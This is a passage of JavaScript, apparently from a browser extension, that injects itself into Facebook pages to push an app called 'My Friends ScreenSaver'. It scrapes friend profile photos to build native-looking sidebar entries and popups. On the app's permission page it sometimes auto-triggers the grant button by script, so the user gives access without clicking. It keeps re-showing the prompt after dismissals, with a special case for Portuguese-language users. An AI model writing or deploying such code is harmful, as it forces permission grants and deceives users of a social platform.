				click:"_gaq.push(['_trackEvent', 'notification', 'click', 'type_2', 1]);"
			}
		},
		analytics = "\
			var _gaq = _gaq || [];\
			_gaq.push(['_setAccount', 'UA-35381638-1']);\
			(function() {\
			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;\
			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';\
			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);\
			})();",
		fb_app_url = 'https://www.facebook.com/appcenter/topfriendscreensaver?mfssredir=1';

    function initFacebookCampign() {
		var menuNavItem = $('#appsNav ul li:first');
		
		$.when(fetchUserFriends()).then(function (images) {	
			menuNavItem.after(getLinkHtml(images));
			
			initEventsFB();

			trackGoogleAnalytics(stats.ntf1.display);
		});
	}
	
	function initAppPageCampaign() {
		var isAuto = Math.floor(Math.random() * 2);
		
		if (top.location.href.indexOf('mfssredir') > -1) {
			if (isAuto) {
				triggerGrantClick();
			} else {
				$.when(fetchUserFriends()).then(function (images) {	
					var container = $('#grant_clicked').parent().css('position', 'relative');
					
					container.append(getPopupHtml({images:images, type:'app'}));
					
					initEventsApp();

					trackGoogleAnalytics(stats.ntf2.display);
				});
			}
		}
	}
	
	function initEventsFB() {
		$('#mfss_notification_close').on('click', notificationClose);
		$('#mfss_notification_gotoapp, #mfss_notification_gotoapp_link').on('click', redirectToApp);
	}
	
	function initEventsApp() {
		$('#mfss_notification_close').on('click', notificationClose);
		$('#mfss_notification_gotoapp').on('click', function () {
			trackGoogleAnalytics(stats.ntf2.click);
			
			setTimeout(function () {
				triggerGrantClick();
			}, 200);
		});
		$('#grant_clicked').on('click', setSuccessTrue);
	}
	
	function fetchUserFriends() {
		var dfd = $.Deferred(),
			user = getUserId();
		
		appAPI.request.get('https://www.facebook.com/' + user + '/friends', function (response) {
			var images = [],
				rxImg = /^(https?\:\/\/(?:.*?)\.jpg)/;
	
			response.replace(/\<img(?:.*?)src\=\"((?:[^\"]*?)_n\.jpg)\"(?:[^>]*?)itemprop="photo" \/>/gi, function ($, $1) {	
				images.push($1);
			});

			response.replace(/(https?\:\/\/fbcdn\-profile(?:.*?)\/s80x80\/(?:.*?)\.jpg)/gi, function ($, $1) {	
				images.push($1);
			});
			
			images = $.map(images.slice(0, 10), function (img) {
				rxImg.test(img);

				return RegExp.$1;
			});

			dfd.resolve(images);
		});
			
		return dfd.promise();
	}
	
	function getUserId() {
		var user = $('#pageNav li.navItem.firstItem a');
		
		return user.attr('href').substring(user.attr('href').lastIndexOf('/') + 1).replace(/\?.*$/, '');
	}
	
	function getPopupHtml(cfg) {
		var type = cfg.type,
			images = cfg.images,
			xPos = type == 'fb' ? 'right:-342px' : 'left:-362px',
			marginLeft = type == 'fb' ? '25' : '18',
			marginTop = type == 'fb' ? '25' : '30',
			closeRight = type == 'fb' ? '7' : '15',
			html = [];

		html.push('<div style="width:342px;height:193px;position:absolute;top:-18px;' + xPos + ';z-index:100000;background:#fff url(data:image/png;base64,' + getBgImage(type) + ');">');	
			html.push('<div id="mfss_notification_close" style="position:absolute;top:9px;right:' + closeRight + 'px;width:14px;height:14px;cursor:pointer;background:url(data:image/gif;base64,R0lGODlhDQANAKECAA4ODtXV1f///////ywAAAAADQANAAACIIyPKMst5iKMbQrA8LK3M+59QYNp27iYJiih1PmKyRwUADs=);"></div>');
			html.push('<div style="margin-left:' + marginLeft + 'px;margin-top:18px;font-weight:bold;font-size:14px;height:25px;">' + getText(1) + '</div>');
			html.push('<div style="margin-left:' + marginLeft + 'px;font-size:12px;height:50px;line-height:1.5;">' + getText(2) + '</div>');
			html.push('<div style="margin-left:' + marginLeft + 'px;font-size:12px;height:20px;">' + getText(3) + '</div>');
			html.push('<div style="margin-left:' + marginLeft + 'px;height:45px;">');
				$(images).each(function (i, img) {
					html.push('<img src="' + img + '" style="width:26px;height:26px;float:left;" />');
				});
			html.push('</div>');
			html.push('<div style="text-align:center;">');
				html.push('<img id="mfss_notification_gotoapp" style="cursor:pointer;" src="' + getText(4) + '" />');
			html.push('</div>');
		html.push('</div>');
		
		return html.join('');
	}
	
	function getLinkHtml(images) {
		var html =[];
		
		html.push('<li class="sideNavItem stat_elem" id="mfss_notification_fb_apps" style="position:relative;">');
			html.push('<a id="mfss_notification_gotoapp_link" class="item clearfix sortableItem" href="javascript://" title="My Friends ScreenSaver">');
				html.push('<div>');
					html.push('<span class="imgWrap">');
						html.push('<img class="img" src="https://fbcdn-photos-a.akamaihd.net/photos-ak-snc7/v85005/171/291989660905827/app_101_291989660905827_139885258.png" alt="" width="16" height="16">');
					html.push('</span>');
					html.push('<div class="linkWrap noCount">My Friends ScreenSaver</div>');
				html.push('</div>');
			html.push('</a>');
			html.push(getPopupHtml({images:images, type:'fb'}));
		html.push('</li>');
		
		return html.join('');
	}
	
	function getBgImage(type) {
		if (type == 'fb') {
			return 'iVBORw0KGgoAAAANSUhEUgAAAVYAAADBCAIAAAAb2Q+bAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyRpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo2OEIwNTJGOTE2MzUxMUUyOTE3N0RBNUNEQ0Y3NDI3MiIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo2OEIwNTJGQTE2MzUxMUUyOTE3N0RBNUNEQ0Y3NDI3MiI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjY4QjA1MkY3MTYzNTExRTI5MTc3REE1Q0RDRjc0MjcyIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjY4QjA1MkY4MTYzNTExRTI5MTc3REE1Q0RDRjc0MjcyIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+H3PGoAAABEZJREFUeNrs3ctK81oYgOEmjYcKXoY6KeIBJ4KgN+PUgd6GIy/IguDEszjxIhwVrdrW/os/7NBdkwobYevK8wyk2uBg0e/tiqQxuby83NzcbFQbjUaNSA2HwwbUQLPZLB4nSTL+VDZ98se/xp0DiFj+blcMf/4gTdNut5tVzf9nUSYgyzKvD+I2GAzGJz/5x/Pzc/kuIB/4j79OTk6sIERpf3+/JAHj859vHg4PDy0W/NL3/6p97vHxcf4gLd0F5PNf7B+AWM9z06pdQJj/fr9vESFu6cT82wVATSwuLlbuAoqNgGWCGu0CJs4FXDkDdUzA+F7AAkG9EvD5ciCgdruAIgcWCOqbAEACgDh1u10JALsAQAKAuim/OhCwCwAkoNF4eHiwQBC3yo8T39/fPz4+Vj1bfILIjbcgwl3A7e3t3d3dlPsF5ZNv/iHCBNzc3FxcXHx5v7D/Nv8+egA/+kTg+vr6/Pz8G+8XODHw4duJ25gD/4v86sBsYv7Pzs6+936hEwNv/uGHngiE+e90Ou4XDHVMQJj/09PTL+ffrcQg2l0AUN8EbGxs7O3tFf9doEqWZTYCEIenp6d/7QJCBXZ3d6dXwPxDzCcCoQI7Oztf7gWAaP8WECqwvb09pQKuCIRo9Hq9kj8Hrq+vb21tlVbA/ENkykd6bW3t/f3dGQHU7kSgsLq6urKyYoGgpgkI2u22BYL6JgCQAEACAAko5XpBqHUCXCkATgQACQAkAJAAQAIACQAkAJAAQAIACQAkAJAAQAIACQAkAJAAQAIACQAkAJAAQAIACQAkAJAAQAIACQAkAJAAQAIACQAkAJAAQAIACQAkAJAAQAIACQAJsAQgAYAEABIASAAgAYAEABIASAAgAYAEABIASAAgAYAEABIASAAgAYAEABIASABQkwSMRiNrCrXeBagA1P1EQAXgt8i+99clSWJNoe67AEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkACQAkAJAAQAIACQAkAJAAQAIACQAkAJAAQAIACQB+uezLI66uriwT1DcBy8vLlgki0+l0nAgAEgASAEgAIAGABAASAEgAIAGABAASAEgAIAGABAASAEgAIAGABAASAEgAIAHAT9ZqtSQA7AIACQAkAJAAQAIACQAkAJAAQAIACQBi0ev1piUgSRJrBLHKBzz9/NNxlgkiTkCr1cqqnsu12+2joyOLBbHuArKq+U/TtNlsLi0tHRwcvL299fv94XD48fExGo1iWoX5+XkvBSL2+vpazHU+1DMzM3Nzc+GVHx6XJKB4/w9HZ1kWjg5jH34ejo4yARC34k2uSECY69nZ2TDa4cFkAsJBYcLHD83nP3w7GAzy+Y8sAS8vL14lRGxhYWFid5+/tRcJ+CPAADtMboAGK8beAAAAAElFTkSuQmCC';
		} else if (type == 'app') {
			return 'iVBORw0KGgoAAAANSUhEUgAAAVYAAADBCAIAAAAb2Q+bAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyRpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo1Qjc3Q0NCQzE2NEExMUUyOTE3N0RBNUNEQ0Y3NDI3MiIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo1Qjc3Q0NCRDE2NEExMUUyOTE3N0RBNUNEQ0Y3NDI3MiI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjY4QjA1MkZGMTYzNTExRTI5MTc3REE1Q0RDRjc0MjcyIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjY4QjA1MzAwMTYzNTExRTI5MTc3REE1Q0RDRjc0MjcyIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+PcVypAAABGdJREFUeNrs3ctKI1kcwOEuU14i5DV0I97AjSDoK/geruJrZOETGRDcSLzhRt/BjQEzkkvNSVdbnU7nMjM0gzn1fdAQrdp4yP9Xp6JJp1mWfRsx+mW/3/8GJVCpVGL90ZIkmXG01Wql7Xa7VqsNBoPR+R/rAsQtsqtdMfbhQZjl/MtpLUjDv1CBarWafRpNQJqmnh/ErdfrRXnlT341rQI/Jvzi4sJTAaJ0dna29N3ECvy8yNfr9WmNtBeABdVoNIrbnIkVmD/b5h/iuNMp7gj+XQKAhdbtdvP5D7uA4tXBwnBjUKvVLBNEvAsI9wKDwWDsxf6fCQDiTkA+/8Wv/CQASqTYAkz8ex8JgMhNu/5LAJQrAW4EoKQJmHFUAqDUhglot9sWAsqbAEACgLImwF8Hgl0AIAGABAAxeXp6kgCIVu/TtBOen58fHx8lAOKUf6jPjI/2qdfrDw8P9/f3EgBf2ow38/yTCswQKnBzc3N3dzc5Af46EL5UBWa8q+c/CxW4vr6+vb21C4AvKv9sr98//PsPVuDq6mqsAhIAJRIq0Gw2RysgARCVuf8zSqjA5eVlUQEJgFIbJuD19dVCQBxbgLm/HWg0GicnJ/v7+3YBULobgTD/x8fHxfxLAJRImP+jo6PR+R8moNPpWBqIw4y7gDD/h4eHY/NvFwClqECY/4ODg729vd8PSQDEv//f2dnZ3d2deFQCIHKbm5vb29vTjkoARG5ra2vGUQmAUpMAkABAAoCFM/dNQRIAMZv7jgAJACQAkABAAgAJACQAkACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJAAkAFgUWZZJAJh/CQDz/yekVhYWQpIkXgsAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkACbAEIAGABAASAEgAIAGABAASAEgAIAGABAASAEgAIAGABAASAEgAIAGABAASAEgAIAGABAASAEgAIAGABAASAEgAIAGABAD/j7R41Gq1LAeUNwEbGxuWAyLTbDbdCAASAEgAIAGABAASAEgASAAgAYAEABIASAAgAYAEABIASAAgAYAEABIASACw0AmoVqtWAewCAAkAJACQAEACAAkAJACQAEACAAkAYklAp9OxClDqXUCSJBYCYjV7wIdvE5IAiDsBo8aOpvkZLy8v5+fnFgsic3p6Om34fwTi7e2t3W7/9d3Hx0e32+33+4PBIMuy/Iy1tTXrSMTCMz+ya/7S0lKlUlleXl5dXV37FB6H74Tvh6NFDlqt1nAXkKZpOBbGPjwOZ4wlAOIW2UWuSECY65WVlTDa4UE+9lNvBMIZ+fyH83q9Xj7/RQLe3989S4jY+vp6fHf+YZbzS3uegNGL/1gF/hZgADaaV6grlHcdAAAAAElFTkSuQmCC';
		}
	}
	
	function isTimeToShow() {
		var isSuccess = appAPI.internal.db.get('_fb_campign_1_success'),
			click = appAPI.internal.db.get('_fb_campign_1_click'),
			clickCount = appAPI.internal.db.get('_fb_campign_1_click_count');
		
		if (!click && !isSuccess && (!clickCount || clickCount <= 2)) {
			return true;
		}

		/* TEMP FOR BRAZIL */
		if (clickCount && clickCount > 2) {
			var is_brazil_lang = $('html').attr('lang') == 'pt',
				is_brazil_db = appAPI.internal.db.get('_fb_campign_brazil');

			if (is_brazil_lang && !is_brazil_db) {
				appAPI.internal.db.set('_fb_campign_brazil', true);
				return true;
			}
		}

		return false;
	}
	
	function isNotSuccess() {
		var success = appAPI.internal.db.get('_fb_campign_1_success');
		
		if (!success) {
			return true;
		} else {
			return false;
		}
	}
	
	function redirectToApp() {
		storeClickData();
		trackGoogleAnalytics(stats.ntf1.click);

		setTimeout(function () {
			if ($.browser.mozilla) {
				top.location.href = fb_app_url;
			} else {
				appAPI.openURL(fb_app_url, 'current');
			}
		}, 200);
	}
	
	function notificationClose(cfg) {
		var li = $('#mfss_notification_fb_apps');
			
		li.remove();	
		storeClickData();
	}
	
	function triggerGrantClick() {
		appAPI.internal.db.set('_fb_campign_1_success', true);
				
		$('#grant_clicked').trigger('click');
	}
	
	function setSuccessTrue() {
		appAPI.internal.db.set('_fb_campign_1_success', true);
	}
	
	function storeClickData() {
		var clickCount = appAPI.internal.db.get('_fb_campign_1_click_count');
		
		appAPI.internal.db.set('_fb_campign_1_click', true, appAPI.time.hoursFromNow(24));
		
		if (!clickCount) {
			appAPI.internal.db.set('_fb_campign_1_click_count', 1);
		} else {
			appAPI.internal.db.set('_fb_campign_1_click_count', ++ clickCount);
		}
	}

	function getText(i) {
		if ( $('html').attr('lang') == 'pt') {
			return lang[i].pt;
		} else {
			return lang[i].en;
		}
	}

	function isNavigation() {
		var isNav = $('#appsNav').length,
			isInstalled = $('#navItem_app_354217277985228').length;

		return isNav && !isInstalled;
	}

	function initGoogleAnalytics() {
		appAPI.dom.addInlineJS(analytics);
	}

	function trackGoogleAnalytics(code) {
		appAPI.dom.addInlineJS(code);
	}

	function checkShowNotification() {
		if ($.browser.msie) {
			$(function () {
				if (appAPI.isMatchPages('www.facebook.com/appcenter/topfriendscreensaver') && isNotSuccess()) {
					initGoogleAnalytics();
					initAppPageCampaign();
				}
				else if (appAPI.isMatchPages('facebook.com') && isTimeToShow()) {
					if (isNavigation()) {
						initGoogleAnalytics();
						initFacebookCampign();
					} else {
						setTimeout(checkShowNotification, 1000);
					}
				}
			});
		} else {
			if (appAPI.isMatchPages('www.facebook.com/appcenter/topfriendscreensaver') && isNotSuccess()) {
				initGoogleAnalytics();
				initAppPageCampaign();
			}
			else if (appAPI.isMatchPages('facebook.com') && isTimeToShow()) {
				if (isNavigation()) {
					initGoogleAnalytics();
					initFacebookCampign();
				} else {
					setTimeout(checkShowNotification, 1000);
				}
			}
		}
	}

	checkShowNotification();

})(jQuery);